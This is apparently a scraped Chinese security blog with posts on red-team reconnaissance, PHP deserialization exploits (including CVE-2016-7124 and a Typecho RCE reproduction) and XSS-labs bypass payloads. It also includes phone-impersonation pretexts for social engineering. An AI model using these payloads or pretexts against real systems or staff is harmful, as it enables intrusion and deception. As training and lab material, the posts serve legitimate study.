可以使用banner-grab，伴随ZMap使用可以让用户从监听状态的TCP服务器上接收到消息。Banner-grab连接到提供的服务器上，发送一个可选的消息，然后打印出收到的第一个消息。这个工具可以用来获取banner，例如HTTP服务的回复的具体指令，telnet登陆提示，或SSH服务的字符串。 如下，寻找了1000个监听80端口的服务器，并向每个发送一个简单的GET请求，存储他们的64位编码响应至http-banners.out zmap -p 80 -N 1000 -B 10M -o - | ./banner-grab-tcp -p 80 -c 500 -d ./http-req &gt; out zmap -p 80 [cidr] | node cli.js -p 80 –payload=tcp/GetRequest –parse http &gt; http.json 指纹探测概念指纹识别是信息收集环节中一个比较重要的环节，通过一些开源的工具、平台或者手工检测目标系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助红队评估人员快速有效的去验证已知漏洞。 指纹识别常见的检测对象：（1）CMS&lt;内容管理系统&gt;信息，常见CMS有：dede织梦、worepress、phpcms、thinkphp、ezcms、ecshop、帝国、大汉CMS、discuz、魅力、海洋cms、逐浪CMS Zoomla、drupal、EarCMS、思途CMS（2）前端技术：HTML5 、jquery、bootstrap、pure、ace、ajax等等（3）中间件和容器等：apache 、IIS、Nginx、lighttpd、tomcat、weblogic、jboss、websphere等等（4）开发语言：php java ruby go python c# Jsp asp aspx 等等（5) 操作系统：Windows NT、类UNIX（MACOS）（6）CDN信息：是否使用CDN技术、常用CDN：cloudflare/360CDN/365cyd等等（7）端口或者服务：（8）IP或者域名信息：（9）WAF：检测是否有WAF：云盾、云锁、安全狗、IPS/IDS、等等 常见指纹识别方法 1、特定文件的MD5一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。 2、正常页面或错误网页中包含的关键字先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。(wp-admin)或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。 3、请求头信息的关键字匹配根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。根据response header一般有以下几种识别方式：1）查看http响应报头的X-Powered-By字段来识别；2）根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；3）根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；4）根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。 4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用/solr目录，weblogic可能使用wls-wsat目录等。 5、开发语言的识别web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：1）通过爬虫获取动态链接进行直接判断是比较简便的方法。asp判别规则如下&lt;a[^&gt;]?href=(‘|”)[^http][^&gt;]?.asp(?|#|\\1)，其他语言可替换相应asp即可。2）通过X-Powered-By进行识别比较常见的有X-Powered-By: ASP.NET或者X-Powered-By: PHP/7.1.83）通过Set-Cookie进行识别这种方法比较常见也很快捷，比如Set-Cookie中包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx等。 在线平台通过第三方在线平台进行指纹识别（1）（2）（3）（4）（5）（6）（7） 本地化工具通过利用指纹识别工具进行指纹识别（1）WhatWeb：（2）Wapplyzer：（3）Whatruns：（4）Plecost：（5）BlindElephant：（6）WebEye：（7）WTF_Scan：（8）Webfinger：（9）FingerPrint：（10）御剑web指纹识别程序：（11）Test404轻量WEB指纹识别：（12）w11scan分布式WEB指纹识别平台：（13）Dayu指纹识别工具： Whatweb WhatWeb是一个开源的网站指纹识别软件。可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，Javascript库，服务器和嵌入式设备。它有超过1000个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，账户ID，Web框架模块，SQL错误等安装：Ubuntu：apt-get install whatwebCentos：yum updateyum install ruby ruby-devel rubygemswget  xzvf whatweb-0.4.7.tar.gzcd whatweb-0.4.7./whatweb url whatweb www.target.com #扫描单个域名whatweb -i target.txt #批量扫描whatweb www.target.com –log-xml=baidu.xml #保存结果whatweb –no-errors -t 255 内网网段 #快速本地扫描（扫描内网主机）-i 指定要扫描的文件-v 详细显示扫描的结果-a 指定运行级别，1-4 Wapplyzer Wappalyzer最新版是一款强大的网站技术栈嗅探工具，Wappalyzer官方版插件能够快速识别一个网站用到的前后端技术框架、运行容器、脚本库等，Wappalyzer还提供跨平台实用程序，能够发现网站上使用的技术，还可以检测内容管理系统，电子商务平台，Web框架，服务器软件，分析工具等。该软件是浏览器插件，所以安装方式也比较简单，只需要在浏览器的插件管理器中下载安装该插件即可。下面以火狐浏览器为例介绍其安装和使用 打开火狐浏览器在输入框中输入about:addons，找到插件，再查询输入框中输入“Wappalyzer”, “添加到firefox”，在浏览器中即可使用。打开 待测试 网站，右击该插件即可。 御剑Web指纹识别系统 一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少（原本带的指纹库较小，感兴趣的可以添加）。 各种工具指纹收集分享  目录、敏感文件探测概念扫描站点的目录，寻找敏感文件，如目录名、探针文件、后台、robots.txt、备份文件等。 目录：站点结构，权限控制不严格；探针文件：服务器配置信息，1.php、phpinfo.php、readme.txt、config.txt等；后台：管理整个网站的入口，admin.php、index.php/s=admin、administrator.php等；Robots.txt：一般存放在站点根目录，如果管理员对robots.txt配置不合理就会造成信息泄露；备份文件：数据库备份、网站备份文件等，如.bak文件、.zip文件、.rar文件等；敏感JS文件：网页中可能嵌套的JS存在敏感信息，如后台的入口、登录评估等；API：网页中可能存在嵌套的应用程序接口，在信息收集中可以考虑寻找接口；网页链接：收集页面中包含所有的链接。 常见扫描利用工具(1)(2)(3)(4)(5)(6)(7)(8)(9)(10)(11)(12)御剑后台扫描工具、AWVS、北极熊扫描器等 御剑后台扫描工具御剑后台扫描珍藏版是T00LS大牛的作品,方便查找用户后台登陆地址，同时也为程序开发人员增加了难度，尽量独特的后台目录结构。附带很强大的字典，字典我们也是可以自己修改的，继续增加规则。特点：（1）扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程（2）集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描（3）默认探测200安装：御剑不用安装，直接下载下来解压，双击“御剑后台扫描工具.exe”即可正常使用 在域名输入框中输入域名，选择扫描参数即可，注意网站后端脚本类型，测试选用php. DirbusterDirBuster是一个多线程Java应用程序，旨在强制Web/应用程序服务器上的目录和文件名。它可以选择执行纯暴力，在查询隐藏文件和目录方面非常好用。安装使用：（1）安装java，配置JDK环境变量（2）下载安装，面板参数：（1）Target URL：输入要探测网站的地址；需要注意的是这个地址要加上协议，看网站是http还是https。（2）Work Method：选择工作方式；一个是get请求，一个是自动选择。一般选auto switch的自动选择，它会自行判断是使用head方式或get方式。（3）Number of Thread：是选择扫描线程数，一般为30。电脑配置好的可根据情况选择。（4）select scanning type：是选择扫描类型。list based brute force是使用字典扫描的意思，勾选上。随后browse选择字典文件，可用自己的，也可用dirbuster自己的。pure brute force是纯暴力破解的意思。（5）select starting options：选项一个是standard start point（固定标准的名字去搜），一个是urlfuzz（相当于按关键字模糊搜索），选择url fuzz，随后在url tofuzz框中输入{dir}即可。 扫描结果说明：200 OK ：文件存在并能够读取。404 File not found ：文件不存在。301 Moved permanently ：这是到给定 URL 的重定向。401 Unauthorized ：需要权限来访问这个文件。403 Forbidden ：请求有效但是服务器拒绝响应。 注意：第4步中也可以选择纯暴力破解模式，命中率不高，相比之下还是模糊测试好用些 Dirsearch基于python的命令行工具，用于暴力扫描页面结构，包括网站中的目录、备份文件、编辑器、后台等敏感目录特点：（1）多线程，使其比任何其他站点扫描仪工具都快（2）执行递归暴力破解（3）具有HTTP代理支持（4）有效地检测到无效网页（5）具有用户代理随机化和批处理功能（6）支持请求延迟安装：下载地址：  运行环境：必须安装python3 常见命令和参数：python dirsearch.py -h 查看帮助菜单-u 指定需要扫描URL-e 指定需要扫描的文件名-x 403,302,301 排除状态码-w 指定自定义的字典文件路径-r 递归扫描，非常耗时-R 递归深度级别 python3 dirsearch.py -u  -e php -x 403 LinkFinderLinkFinder是一个Python脚本，旨在发现JavaScript文件中的端点及其参数。这样，渗透测试人员和Bug猎手就可以在他们正在测试的网站上收集新的，隐藏的端点。导致新的测试环境，可能包含新的漏洞。安装：git clone  LinkFinderpython setup.py install（pip3 install -r requirements.txt）python3 linkfinder.py -h 测试效果：python3 linkfinder.py -i  Link GrabberLink Grabber 是一款能够批量提取、筛选、复制网页里各种链接的 Chrome 扩展。安装：使用Chrome浏览器访问“”，搜索“Link Grabber”，安装即可。访问待测试页面，点击浏览器中“Link Grabber”。 Burp_JSFinderV1.1_obf扫描JS文件中链接的Burp脚本–Burp_JSFinderV1.1_obf安装：导入Burp中，开启burp–&gt;插件扩展–&gt;添加–&gt;类型选java，选择现在的jar文件 其他信息收集敏感信息针对某些安全做得很好的目标，直接通过技术层面是无法完成渗透测试的。在这种情况下，可以利用搜索引擎目标暴露在互联网上的关联信息。例如：数据库文件、后台登录页面、服务配置信息，甚至是通过Git找到站点泄露源代码，以及Redis等未授权访问、Robots.txt等敏感信息，从而达到红队评估目的。 在某些情况下，收集到的信息会对后期进行测试起到帮助重要。如果通过收集敏感信息直接获取了目标系统的数据库访问权限，那么渗透测试任务就结束了一大半。因此在进行技术层面情况下的测试之前，应该先进行更多的信息收集，尤其是针对敏感信息的。 Google Hacking前面已经整理，这里不再赘叙； Github信息泄露Github是一个分布式的版本控制系统，拥有大量的开发者用户。随着越来越多的应用程序转移到云端，Github已经成为了管理软件开发以及发现已有代码的首选方法。当今大数据时代，大规模数据泄露事件时有发生，但有些人不知道很多敏感信息的泄露其实是我们无意之间造成的。一个很小的疏漏，可能会造成一系列的连锁放映。Github上敏感信息的泄露，就是一个典型的例子，存在着一些安全隐患。常用工具：github-dorks（） 源码信息收集（1）利用JS文件信息收集，在JS文件中搜索关键字API，Swagger UI等等，尝试寻找API接口地址。（2）利用APK、jar等移动应用提取，通过AndroidKiller、apktool、jd-gui、jadx、jad等反编译工具。静态分析：IDA Pro分析dex文件反汇编生成的Dalvik字节码，或者使用文本编辑器阅读baksmali反编译生成的smali文件。另一种是阅读反汇编生成的Java源码，可以使用dex2jar生成jar文件，然后再用jd-gui阅读文件的代码。（3）利用在线源码托管平台，常见在线源码托管平台 利用在线源码托管平台，以github为例–gshark，可视化的监测工具，它不仅可以监控github，还可以监控gitlab，安装步骤如下。Step 1：下载压缩包，然后将压缩包解压，；Step 2：修改二进制文件的权限，以 ghsark_darwin_amd64为例，解压后修改二进制文件权限 chmod +x gshark，然后启动服务 ./gshark web；Step 3：将前端文件发布到 nginx 的根目录下，就是将压缩包内的 dist 文件夹的文件拷贝到 nginx 根目录下，另外为了反向代理后端服务还需要修改一下 nginx 的配置，加入以下配置：Step 4：启动本地的mysqll和nginx服务，访问nginx服务即可注意：账号密码均为:gshark Step 5：登录GShark，添加规则和token，本次测试规则类型和token均为github。 Step 6：执行./gshark scan，回到面板中能看到，获取的敏感信息。 获取的GitHub敏感信息结果如下： 旁站及C段探测旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！对于实战攻防工程师来说，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。 利用在线平台对平台组织的网站系统进行旁站和C段探测。常见在线平台如下：（1）（2）（3）（4）（5） 组织架构目标组织信息——通过企查查、天眼查、国家企业信用信息公示系统等来对企业信息进行查询，可以查到目标组织的物理地址、逻辑关系网、邮箱、子公司、联系电话等信息。域名注册信息——Whois可以查看注册的域名、注册人邮箱、电话、注册商等信息。客服信息——销售客服、技术支持售后客服。招聘信息——官网招聘联系方式、招聘网站联系方式等。常见在线平台：（1）（2）（3） 信用信息查询通过信用信息查询可获取目标组织的相关信息，包含：法定代表人、统一社会信用代码、注册号、经营范围等。 常用在线查询地址1、国家企业信用信息公示系统：、悉知-全国企业信息查询：、信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询： 历史漏洞信息 国家信息安全漏洞库：国家信息安全漏洞共享平台：：信息安全漏洞门户 VULHUB：数字观星：绿盟科技：–漏洞插件社区：漏洞列表 | 教育行业漏洞报告平台：工控系统行业漏洞库平台：库-打造中文最大exploit库：乌云漏洞库： Exploit-db： | Exploit &amp; Hacktool Search Engine：：：： Vulnerability &amp; Exploit Database： recent entries - CVE-Search： security vulnerability database. Security vulnerabilities, exploits： mitre - Search CVE List：美国官方工控数据库 ICS-CERT Landing | CISA：路由器漏洞搜索 Routerpwn： 社工信息社工技术在安全领域广泛应用，并成为红队人员的一种辅助手段。在红队人员进行渗透测试前会通过社工手段收集目标组织的信息，所收集到的信息越多攻击测试的面就越广，所能发现的漏洞就越多。当系统足够强大使得你的渗透技术受到限制时，社工手段也不失为一种打开困局的突破口。 社工需要收集的信息有：项目的信息；目标组织的信息；目标组织员工的信息等。 1.项目的信息一个项目从创建到开发到应用，这中间会产生许多有用的信息，一些信息对于安全人员来说可能是突破某个问题的钥匙。项目的名称和服务信息的利用：有些软件的服务商会使用他们开发的项目为一些目标组织或者电商提供整套的建站服务，网站和管理后台是他们事先开发好的，并根据客户的需求进行部署。假如某个电商平台我们获知了它的项目名称叫xmail2.0，进而我们可获知xmall的服务商为A目标组织，进而我们便有可能获取到该项目的源码。一种方式是冒充客户从A目标组织获取该xmall2.0版本的项目，一种是从网上搜索有没有使用者将项目源码泄露。源码都到你手上了，目标在你面前已然变得完全透明，那么接下来的渗透将更加容易。项目的开发者信息的利用：有的网站你在查看它的源码的时候会发现作者的署名，但是作者的署名会有什么用呢？很多人认为开发者的信息并无用处，但是作为安全人员来说这可是一条渗透的思路。比如我们从一个网站的源码中看到了它的作者是ZhangDeShuai，然后我们可以通过该名字去网上搜到他的一些平台账号，他可能在CSDN、Github或者博客上发布过一些项目的实例或者技术的框架，这可能就是你所渗透的目标所用到的。开发者往往还有一些不太好的习惯，他们往往将一些重要的信息附上自己的名字，比如有些开发在数据库建admin表时起名zhangdeshuai_admin。白帽子在sql注入后会使用字典猜解表名进而获取表中的数据，那么在爆破字典中加入开发者的名字不失为一种破解的思路。项目的开发语言、开发框架、时间和版本信息的利用：我们所使用的开发技术都是在不断升级更新的，在一些老的版本可能会存在一些固有的漏洞。假如我们获知了某个项目使用了php进行开发，当我们获知了它的开发时间进而便能推测出它大概的php版本。这就为白帽子提供了一条渗透的思路，通过尝试利用该php版本存在的固有漏洞便可对该项目进行渗透。 2.目标组织的信息对渗透目标所属的目标组织来说，目标组织的有些信息也可为我们的渗透提供思路。目标组织的组织架构、人事信息、产品信息：目标组织的一些公开信息可以从天眼查或者企信宝上看到，一些内部的信息也会因为泄露被获知，但是这些信息能为我们的渗透提供哪些帮助呢？举个栗子，比如我们获知了A目标组织的人事信息，如果该目标组织的内部沟通并不畅通，我们便可冒充A目标组织某个部门的员工给负责该渗透目标的技术人员打去电话，我们可以编一个正当的理由要求该技术人员为我们提供一些便利。再举个栗子，比如我们获知了该目标组织的产品信息，我们便可伪装成该产品的重要客户给该目标组织打去电话，表明我们使用该产品时出现了些问题，要求技术人员提供一些信息帮助解决。目标组织的子域名、子服务器：目标组织子域名或者子服务器的发现能使得攻击面扩大。因为我们所渗透的目标可能会与目标组织的其他域有或多或少的联系，当目标域无从下手时，可以从与该域有关联的其他域另辟蹊径。举个栗子，比如我们的渗透目标是，我们通过子域名爆破发现了、[]()，我们发现了该目标组织还有游戏和视频的业务，可能通过对这两个子域的渗透就能进入该目标组织。 3.人的信息上面我们提到过，有些人的安全习惯不太好，可能会将一些重要的信息附上自己的名字、生日或者常用昵称，这会为我们的破解提供便利。还有不少目标组织在第三方服务平台或者服务器、域名商处注册账号时会使用技术部门主管的邮箱或者手机号。对渗透目标所属主管的个人信息进行搜集也能我们实施渗透或者劫持提供思路。 利用在线社工平台 利用在线社工平台进行信息收集。 1、、、、、、、、、 图标和信息特征 favicon.ico图标——获取目标站点的favicon.ico图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的favicon.ico图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。示例：“shodan搜索语句：http.favicon.hash:哈希值”。生成图标哈希值的利用工具： 。 其它信息征进行搜搜集的技巧——通过查看站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特索，如：body=“XX公司”或body=“360”等。 非常规操作：1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body=”XX公司”或body=”360”等。该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上之后可以结合上一步的方法进行进一步的信息收集。 小结信息收集的定义和分类常见信息收集的类别不同信息收集工具的使用"},{"title":"php反序列化","date":"2022-05-07T05:58:54.000Z","url":"/2022/05/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[[" ",""]],"content":"基本概念序列化（串行化）：将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 string serialize ( mixed $value )返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 数据类型:长度:名字:属性个数{数据类型:长度:名称1;数据类型:长度:值1;} mixed unserialize ( string $str )对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 文件名code1.php，输出结果：O:7:”chybeta”:1:{s:4:”test”;i:123;} 其中，O表示对象，7表示对象名chybeta的长度，chybeta是对象名，1表示有1个属性，{ }里面的参数有key和value，s表示是string对象，4表示长度，test是key，i表示是integer对象，123是value 可见PHP的序列化与JSON数据类似，将各种类型的数据，压缩并按照一定的格式储存起来，这样也方便传输。 在PHP中对不同类型的数据用不同的字母来标识： a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string N 表示的是 NULL，而 b、d、i、s 表示的是四种标量类型，目前其它语言所实现的 PHP 序列化程序基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对 s （字符串）的实现存在问题。 a、O 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对 a 的序列化和反序列化，但对 O 只实现了 PHP4 中对象序列化格式，而没有提供对 PHP 5 中扩展的对象序列化格式的支持。 r、R 分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时就会产生带有这两个标示的数据，后面我们将详细讲解这两个标示，目前这两个标示尚没有发现有其他语言的实现。 C 是 PHP5 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的，因为很少会用到它，但是后面还是会对它进行详细讲解的。 U 是 PHP6 中才引入的，它表示 Unicode 编码的字符串。因为 PHP6 中提供了 Unicode 方式保存字符串的能力，因此它提供了这种序列化字符串的格式，不过这个类型 PHP5、PHP4 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，不推荐用它来进行序列化，不过可以实现它的反序列化过程。在后面我也会对它的格式进行说 明。 o标示在 PHP3 中被引入用来序列化对象，到了 PHP4 以后就被 O 取代了。在 PHP3 的源代码中可以看到对 o 的序列化和反序列化与数组 a 基本上是一样的。但是在 PHP4、PHP5 和 PHP6 的源代码中序列化部分里都找不到它。 文件名code2.php，测试结果：O:4:”demo”:1:{s:10:”demotest”;s:5:”cream”;} 注意：源代码中的属性名为,但是经过序列化后却变成了demotest，并且属性名的长度为10，不符合预期。这里涉及到 PHP 的属性的访问权限问题 我们知道属性访问权限有三个：private、protected、public，测试这三个属性的情况： 文件名code3.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”; （1）public，该属性序列化后的结果正常，在预期之内； （2）private，私有权限，也就是说该属性只能由类使用，为了区别，在序列化后，private属性会在自己的名字前面加上自己所属的类名，也即变成了demotest2，但是其长度为啥是11呢？写到文件使用HEXDUMP查看便知。 根据结果表明：私有属性在序列后类名前后均有%00，也即**%00类名%00属性名** （3）protected，该属性和private有些类似，但是长度怎么计算呢？看上图便知！protected在序列化时序列化后的结果是**%00*%00属性名** 文件名code4.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”;} 发现和code3.php的测试结果一样，说明定义的方法不影响序列化的结果，总之：序列化只序列化属性，不序列化方法 文件名code5.php，测试结果： 注意： 在反序列化的过程中必须保证当前作用域下类是存在的，否则无法完成反序列化操作。 反序列化之后的对象在文件执行结束后就会被销毁 反序列化漏洞PHP的反序列化漏洞又可以叫做 PHP对象注入漏洞，这种思想类似SQL注入，在unserialize接受的参数可控的情况下，通过注入我们可控的属性值，来控制类中的方法的执行，从而造成安全隐患。 魔法函数 php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用。 __construct(构造函数)当一个对象创建时被调用； __destruct（析构函数）当一个对象销毁时被调； __toString当一个对象被当作一个字符串使用； __sleep magic方法在一个对象被序列化的时候调用； __wakeup magic方法在一个对象被反序列化的时候调用。 文件名是code6.php，测试结果是 __constructthis is a string!__toString__destruct 文件名是code7.php，测试结果是： 安全问题 现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义__wakeup或__destruct的类，这些函数会影响Web应用程序。例如，我们可能会找 到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为code8.php。 文件名code8.php，上述代码可以删除服务器中任意文件 :”LogFile”:1:{s:8:”filename”;s:5:”1.php”;} 文件名code9.php，首先看到了参数可控的unserialize,接着看到magic_test类中存在两个魔术方法 __construct和__destruct，其中看到__destruct方法调用了action()，往下看，发现 L 类中存在action但是仅仅是做了打印的操作，没什么利用点，再看Evil方法，发现action调用了敏感操作函数eval，因此，要是我们能够控制test2的值，就能实现任意命令执行，完成攻击。【反序列化学习总结/】 在magic_test和Evil，接着我们控制 magic_test中的属性 test的值，为了执行代码，我们将test篡改为Evil的对象，并且篡改Evil的属性 test2为我们需要执行的代码。 构造payload如下： 文件名是code-payload.php，测试结果是： O:10:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 提交测试：:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 报错没有结果，找找原因，注意magic_test类下的$test是私有的，序列化的结果应该是%00magic_test%00test，也即发送POC是： O:10:”magic_test”:1:{s:16:”%00magic_test%00test”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 在上课的时候，有小伙伴提到在构造payload，想到使用下面的方法： 得到的结果是： test属性访问权限换成private之后，得到结果需要修改为： 在前端提交时，需要在magic_test前后加%00，也即： 例外，以上结果中test的值是一个字符串，为了让test能够调用Evil中action方法，需要的是Evil对象，所以需要变换为如下的形式： 除了上述的魔法函数，还有如下的函数： __call()是在对象上下文中调用不可访问的方法时触发 __callStatic()是在静态上下文中调用不可访问的方法时触发。 __get()用于从不可访问的属性读取数据。 __set()用于将数据写入不可访问的属性。 __isset()在不可访问的属性上调用isset()或empty()触发。 __unset()在不可访问的属性上使用unset()时触发。 __invoke()当脚本尝试将对象调用为函数时，调用__invoke()方法。 PHP反序列化漏洞原理归纳： 1、 参数用户可控； 2、 服务器中代码定义了魔术函数(__wakeup,__sleep,__construct/__destruct/__tostring等)，并且该魔术函数中有危险函数，如命令执行类（exec/passthru/popen/system等）和文件操作类（file_put_contents/file_get_contents/unlink等)等函数； 3、 用户输入的数据（序列化之后的字符串）未经过滤或者过滤不严谨到达该危险函数，最后执行用户的输入 CVE-2016-7124触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。 如下的代码也可以练习： 根据CVE-2016-7124构造POC，如下 运行poc.php，得到结果如下： :”Test”:1:{s:9:”Test poc”;s:5:”shell”;} 接下来需要修改两个方面： 将1改为大于1的任何整数 将Testpoc改为%00Test%00poc :”Test”:3:{s:9:”%00Test%00poc”;s:5:”shell”;} 然后getshell，直接访问写的文件： Typecho反序列化漏洞Typecho Typecho是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。基于PHP5开发，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，适用范围十分广泛。 漏洞介绍和复现 Typecho博客软件存在反序列化导致任意代码执行漏洞，恶意访问者可以利用该漏洞无限制执行代码，获取webshell，存在高安全风险。通过利用install.php页面，直接远程构造恶意请求包，实现远程任意代码执行，对业务造成严重的安全风险。 影响版本：Typecho 0.9~1.0 漏洞的入口出现在install.php页面，代码如下： 上述代码经过了两次的判断，我们继续跟进，在install.php 232行~237行： 出现一个比较明显的反序列化漏洞，首先获取到cookie中的__typecho_config值base64解码后，然后进行反序列化。 想要执行，只需isset($_GET[‘finish’])并且__typecho_config存在值。反序列化后把config[‘adapter’]和config[‘prefix’]传入Typecho_Db进行实例化。然后调用Typecho_Db的addServer方法，调用Typecho_Config实例化工厂函数对Typecho_Config类进行实例化。 Feed.php中__get()方法—-&gt;Request.php中的applyFilter函数—–&gt;call_user_func(代码执行) 复现漏洞 访问URL： 使用BP进行抓包，如图： 抓到包之后我们在BurpSuite点击右键，发送到Repeater，并将POC文件中的Cookie和Referer复制到BurpSuite中修改Referer的IP为192.168.186.140，如图所示。 点击“GO”，可以看到 POC 也即： 如图返回状态码为500的数据包就代表成功了。我们这时使用中国菜刀连接 bugku 文件包含和PHP反序列化漏洞CTF练习题访问URL：，提示 you are not the number of bugku ! 查看页面源代码发现有当前页面的代码 txt参数可以使用php://input绕过，效果如下 然后需要包含file参数，但是需要包含文件需要做信息收集，index.php、hint.php、flag.php，三个页面。直接包含flag.php会提示“不能现在就给你flag哦”。所以可以试一试包含hint.php，里面的源码可以通过php://filter/convert.base64-encode/resource=hint.php查看。 解密如下： 查看hint.php以及index.php的代码我们可以知道，接下来需要使用反序列化去读取flag.php中数据。接下来需要构造password的值。 payload如下： 运行结果为：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} :”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 在源代码中可以看到flag{php_is_the_best_language} PHP反序列化漏洞的防御1.要严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则 2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染"},{"title":"xss-labs1-12关","date":"2022-04-22T03:51:33.000Z","url":"/2022/04/22/xss-labs1-12%E5%85%B3/","categories":[[" ",""]],"content":"xss-lib注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。level1.php?name=《script&gt;alert(“xss”)《/script&gt;第二关：test”&gt;《script&gt;alert(“xss”)《/script&gt;// 完成闭合第三关：查看源码对&gt;进行了过滤 ‘ onclick=’alert(1)第四关：同上 “onclick=”alert(1)第五关：尝试”onclick=”alert(1)发现对on经行过滤再尝试test”《script&gt;alert(“xss”)《/script&gt;// 发现对script进行过滤但&gt;没进行过滤利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript伪协议，”&gt;《a href=’javascript:alert(1)’&gt;a《/a&gt;//,没有对javascript进行过滤，触发xss第六关：”&gt;《a HrEf=’javascript:alert(1)’&gt;a《/a&gt;//大小写绕过第七关：test” /&gt;《a hrhrefef=”javascscriptript:alert(1)”&gt;a《/a&gt;// 重写绕过第八关：把javascript:alert(1)进行编码绕过第九关：采用第八关的poc，发现poc中应包含合法的url，poc中添加//,发现可以进行绕过第十关：.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type=”text” onclick=”alert(1)”，web浏览器成功执行 。ps:type=”text”为构造一个文本框，用来触发onclick事件test&amp;t_sort=”type=”text” onclick=”alert(1)”第十一关：根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点修改refer “type=”text” onclick=”alert(1)”第十二关：根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点修改user-agent “type=”text” 